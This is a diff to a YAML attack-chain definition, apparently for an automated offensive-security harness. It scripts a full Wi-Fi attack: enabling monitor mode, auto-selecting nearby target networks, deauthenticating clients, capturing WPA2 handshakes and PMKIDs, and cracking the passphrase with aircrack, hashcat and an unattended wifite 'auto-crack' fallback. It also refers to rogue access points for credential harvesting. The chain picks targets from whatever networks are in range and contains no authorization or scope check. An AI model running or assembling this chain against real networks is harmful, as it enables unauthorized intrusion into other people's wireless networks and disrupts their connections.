@@ -1,85 +1,167 @@
 name: "Evil Twin & WPA2 Handshake Capture Chain"
-description: "Identify target Wi-Fi networks, deauthenticate clients, capture WPA2 handshakes, and crack the PSK. Includes rogue-AP concepts for credential harvesting."
+description: "Adaptable WLAN assessment: discover networks, target an AP, deauth clients, capture the WPA2 handshake, and crack the PSK. Includes rogue-AP concepts, a passive PMKID path (hcxdumptool → hashcat 22000), and the WiFi Auto-Crack Engine as the final one-shot automated fallback."
 category: wireless
-attack_vector: "WLAN discovery → deauth → handshake capture → PSK cracking"
+attack_vector: "WLAN discovery → deauth → handshake capture → PSK/PMKID cracking → WiFi Auto-Crack Engine (one-shot wifite fallback)"
 variables:
   interface:
     required: true
-    description: "Wireless interface in monitor mode (e.g. wlan0mon)"
+    description: "Wireless interface to enable monitor mode on (e.g. wlan0)"
   bssid:
-    required: true
-    description: "Target AP BSSID (e.g. AA:BB:CC:DD:EE:FF)"
+    required: false
+    description: "Target AP BSSID (auto-extracted from discovery if omitted)"
+  essid:
+    required: false
+    description: "Target AP ESSID (auto-extracted if omitted)"
   channel:
     required: false
-    default: "6"
-    description: "Target AP channel"
+    default: "0"
+    description: "Target AP channel (0 = hop all; auto-updated from scan)"
+  wordlist:
+    required: false
+    default: "/usr/share/wordlists/rockyou.txt"
+    description: "Wordlist for cracking"
+  capture_file:
+    required: false
+    default: "evil_twin_cap"
+    description: "-w capture prefix — airodump writes <prefix>-01.cap (deterimistic crack input)"
+  pmkid_capture:
+    required: false
+    default: "pmkid_cap"
+    description: "hcxdumptool output prefix — passive PMKID capture writes <prefix>.pcapng, converted to <prefix>.hc22000"
+  pmkid_duration:
+    required: false
+    default: "45"
+    description: "Passive PMKID capture duration (seconds) before the harness stops hcxdumptool"
 cutting_edge: true
-references: ["Aircrack-ng suite", "Evil twin attack methodology", "WPA2 PMKID attack"]
+references: ["Aircrack-ng suite", "Evil twin attack methodology", "hcxtools (hcxdumptool + hcxpcapngtool)", "hashcat mode 22000 (PMKID)"]
 
 steps:
-  - name: "wifi_discovery"
-    tool: "airodump_capture"
-    description: "Discover nearby networks and identify target AP"
+  - name: enable_monitor
+    tool: monitor_mode_enable
+    description: "Enable monitor mode on the wireless interface"
+    args:
+      interface: "{{interface}}"
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 2
+
+  - name: wifi_discovery
+    tool: airodump_capture
+    description: "Discover nearby networks and auto-extract the target AP's BSSID/ESSID/channel"
     args:
       interface: "{{interface}}"
       channel: "{{channel}}"
+      capture_file: "{{capture_file}}"
     expected_output: "BSSID|ESSID|WPA2"
     timeout: 120
     gate: true
     retries: 1
     extracts:
+      - var: "bssid"
+        regex: "([0-9A-Fa-f:]{17})"
       - var: "essid"
-        regex: "(?:ESSID|\\bSSID\\b)[\\s:]+\\\"?([A-Za-z0-9_\\- ]+)\\\"?"
+        regex: "[\\t ](?!\\*)[^\\t ]{1,32}$"
+      - var: "channel"
+        regex: "[\\t ]([0-9]{1,2})[\\t ]+[0-9]{1,4}[\\t ]+[A-Z0-9]"
 
-  - name: "deauth_clients"
-    tool: "aireplay_attack"
-    description: "Deauthenticate connected clients to force handshake renegotiation"
+  - name: deauth_clients
+    tool: aireplay_attack
+    description: "Deauthenticate connected clients on the target BSSID to force handshake renegotiation"
     args:
       interface: "{{interface}}"
       bssid: "{{bssid}}"
-      attack: "deauth"
+      attack: "0"
     expected_output: null
     timeout: 120
     gate: false
     retries: 2
 
-  - name: "handshake_capture"
-    tool: "airodump_capture"
-    description: "Capture WPA2 4-way handshake on target channel"
+  - name: handshake_capture
+    tool: airodump_capture
+    description: "Capture the WPA2 4-way handshake on the target channel to a .cap file"
     args:
       interface: "{{interface}}"
+      bssid: "{{bssid}}"
       channel: "{{channel}}"
+      capture_file: "{{capture_file}}"
     expected_output: "WPA handshake|handshake"
     timeout: 300
-    gate: true
+    gate: false
     retries: 2
-    extracts:
-      - var: "cap_file"
-        regex: "([\\w\\-]+\\.cap)"
 
-  - name: "pmkid_attack"
-    tool: "hashcat_crack"
-    description: "Attempt PMKID cracking (hashcat mode 22000) from capture"
+  - name: pmkid_capture
+    tool: hcxdumptool_capture
+    description: "Passively capture PMKID/EAPOL frames with hcxdumptool (no deauth needed) into a .pcapng"
     args:
-      hash_file: "output/handshake_capture.stdout.txt"
-      wordlist: "/usr/share/wordlists/rockyou.txt"
+      interface: "{{interface}}"
+      bssid: "{{bssid}}"
+      channel: "{{channel}}"
+      output_file: "{{pmkid_capture}}.pcapng"
+    expected_output: "PMKID|EAPOL|handshake|WPA"
+    timeout: 60
+    gate: false
+    retries: 0
+    on_fail: "warn"
+    # NOTE: no file_gate here — this step PRODUCES the .pcapng, so gating on
+    # its own output would always skip it (the bug that killed the passive
+    # PMKID path). The gates on pmkid_convert / pmkid_crack guard the
+    # consumers instead.
+
+  - name: pmkid_convert
+    tool: hcxpcapngtool_convert
+    description: "Convert the captured .pcapng into a hashcat-ready .hc22000 PMKID hash file"
+    args:
+      input: "{{pmkid_capture}}.pcapng"
+      output_file: "{{pmkid_capture}}.hc22000"
+    expected_output: "PMKID|password|hash|written"
+    timeout: 300
+    gate: false
+    retries: 1
+    on_fail: "warn"
+    file_gate:
+      - "{{pmkid_capture}}.pcapng"
+
+  - name: pmkid_crack
+    tool: hashcat_crack
+    description: "Crack the PMKID hash with hashcat mode 22000"
+    args:
+      hash_file: "{{pmkid_capture}}.hc22000"
+      wordlist: "{{wordlist}}"
       mode: 22000
       attack_mode: 0
-    expected_output: "Cracked|Recovered|Session"
+    expected_output: "Cracked|Recovered|Session|Exhausted"
     timeout: 3600
     gate: false
     retries: 0
+    on_fail: "warn"
+    file_gate:
+      - "{{pmkid_capture}}.hc22000"
 
-  - name: "psk_crack"
-    tool: "aircrack_crack"
-    description: "Crack WPA2 PSK from captured handshake with wordlist"
+  - name: psk_crack
+    tool: aircrack_crack
+    description: "Crack the WPA2 PSK from the deterministic captured handshake file"
     args:
-      cap_file: "{{cap_file}}"
-      wordlist: "/usr/share/wordlists/rockyou.txt"
+      cap_file: "{{capture_file}}-01.cap"
+      wordlist: "{{wordlist}}"
     expected_output: "KEY FOUND|WPA"
     timeout: 3600
     gate: false
     retries: 0
+    file_gate:
+      - "{{capture_file}}-01.cap"
     extracts:
       - var: "psk"
         regex: "KEY FOUND!\\s*\\[\\s*([^\\]]+)\\s*\\]"
+
+  - name: wifi_auto_crack_engine
+    tool: wifite_auto
+    description: "WiFi Auto-Crack Engine — one-shot adaptive cracking: wifite autonomously discovers targets, performs deauth, captures the handshake, and cracks unattended. Zero manual tuning; catches targets the manual + PMKID paths could not crack."
+    args:
+      interface: "{{interface}}"
+      wordlist: "{{wordlist}}"
+    expected_output: "WPA|handshake|key"
+    timeout: 3600
+    gate: false
+    retries: 0
+    on_fail: "warn"
